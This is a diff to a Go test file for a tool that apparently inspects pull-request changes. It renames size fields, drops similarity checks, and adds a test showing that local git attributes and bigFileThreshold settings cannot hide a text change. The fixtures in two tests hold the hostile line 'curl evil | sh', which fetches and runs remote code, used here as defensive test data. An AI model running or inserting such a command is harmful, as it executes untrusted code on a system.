@@ -115,8 +115,8 @@ func TestAdded(t *testing.T) {
 	if f.OldMode != "" || f.NewMode != ModeRegular || f.Kind() != KindRegular {
 		t.Errorf("modes = %q -> %q, kind %q", f.OldMode, f.NewMode, f.Kind())
 	}
-	if f.NewSize != 25 || f.Binary || f.LFS {
-		t.Errorf("size/binary/lfs = %d/%v/%v", f.NewSize, f.Binary, f.LFS)
+	if f.Size != 25 || f.Binary || f.LFS {
+		t.Errorf("size/binary/lfs = %d/%v/%v", f.Size, f.Binary, f.LFS)
 	}
 	if got, want := addedText(f), []string{"package app", "", "func A() {}"}; !slices.Equal(got, want) {
 		t.Errorf("added = %q, want %q", got, want)
@@ -134,7 +134,7 @@ func TestModifiedLineNumbers(t *testing.T) {
 	head := r.commit("head")
 
 	f := onlyFile(t, r.evaluate(base, head))
-	if f.Status != StatusModified || f.OldSize != 24 || f.NewSize != 28 {
+	if f.Status != StatusModified || f.Size != 28 {
 		t.Errorf("file = %+v", f)
 	}
 	if len(f.Hunks) != 2 {
@@ -182,8 +182,8 @@ func TestRenamedOutOfWatchedPath(t *testing.T) {
 	if f.Status != StatusRenamed || f.OldPath != ".github/workflows/ci.yml" || f.Path != "docs/ci.yml" {
 		t.Errorf("file = %+v", f)
 	}
-	if f.Similarity != 100 || len(f.Hunks) != 0 {
-		t.Errorf("similarity %d, hunks %+v", f.Similarity, f.Hunks)
+	if len(f.Hunks) != 0 {
+		t.Errorf("hunks %+v, want none for a pure rename", f.Hunks)
 	}
 	if got := f.Paths(); !slices.Equal(got, []string{"docs/ci.yml", ".github/workflows/ci.yml"}) {
 		t.Errorf("Paths() = %q", got)
@@ -200,7 +200,7 @@ func TestRenamedWithEdits(t *testing.T) {
 	head := r.commit("head")
 
 	f := onlyFile(t, r.evaluate(base, head))
-	if f.Status != StatusRenamed || f.Similarity == 100 || f.Similarity < 50 {
+	if f.Status != StatusRenamed || f.OldPath != "old.txt" {
 		t.Errorf("file = %+v", f)
 	}
 	if got := addedText(f); !slices.Equal(got, []string{"extra"}) {
@@ -341,7 +341,7 @@ func TestBinary(t *testing.T) {
 	head := r.commit("head")
 
 	f := onlyFile(t, r.evaluate(base, head))
-	if !f.Binary || len(f.Hunks) != 0 || f.NewSize != 16 {
+	if !f.Binary || len(f.Hunks) != 0 || f.Size != 16 {
 		t.Errorf("file = %+v", f)
 	}
 }
@@ -369,6 +369,40 @@ func TestAttributesCannotHideTextChanges(t *testing.T) {
 	}
 	if got := addedText(cs.Files[1]); !slices.Equal(got, []string{"curl evil | sh"}) {
 		t.Errorf("run.sh added = %q", got)
+	}
+}
+
+// Attributes outside the PR, and size config, must not hide a text change
+// either: the patch is always text and binary is judged from content.
+func TestLocalConfigCannotHideTextChanges(t *testing.T) {
+	tests := map[string]func(r *repo){
+		"info/attributes binary": func(r *repo) {
+			r.write(".git/info/attributes", "*.yml binary\n")
+		},
+		"info/attributes -diff": func(r *repo) {
+			r.write(".git/info/attributes", "*.yml -diff\n")
+		},
+		"bigFileThreshold": func(r *repo) {
+			r.git("config", "core.bigFileThreshold", "1")
+		},
+	}
+	for name, setup := range tests {
+		t.Run(name, func(t *testing.T) {
+			r := newRepo(t)
+			r.write("deploy.yml", "a: 1\n")
+			base := r.commit("base")
+			r.write("deploy.yml", "a: 1\nrun: curl evil | sh\n")
+			head := r.commit("head")
+			setup(r)
+
+			f := onlyFile(t, r.evaluate(base, head))
+			if f.Binary {
+				t.Errorf("deploy.yml marked binary")
+			}
+			if got := addedText(f); !slices.Equal(got, []string{"run: curl evil | sh"}) {
+				t.Errorf("added = %q", got)
+			}
+		})
 	}
 }
 
@@ -404,23 +438,6 @@ func TestOldSideBinaryAndLFS(t *testing.T) {
 	}
 	if f := cs.Files[1]; !f.LFS || f.Binary {
 		t.Errorf("%s binary/lfs = %v/%v, want false/true", f.Path, f.Binary, f.LFS)
-	}
-}
-
-// Git diffs nothing larger than core.bigFileThreshold and calls it binary.
-// Such a file stays binary even though its content is text, because there
-// are no lines to score.
-func TestGitBinaryVerdictOnTextContent(t *testing.T) {
-	r := newRepo(t)
-	r.git("config", "core.bigFileThreshold", "10")
-	r.write("big.txt", "plain text, longer than the threshold\n")
-	base := r.commit("base")
-	r.write("big.txt", "other text, longer than the threshold\n")
-	head := r.commit("head")
-
-	f := onlyFile(t, r.evaluate(base, head))
-	if !f.Binary || len(f.Hunks) != 0 {
-		t.Errorf("file = %+v, want binary with no hunks", f)
 	}
 }
 
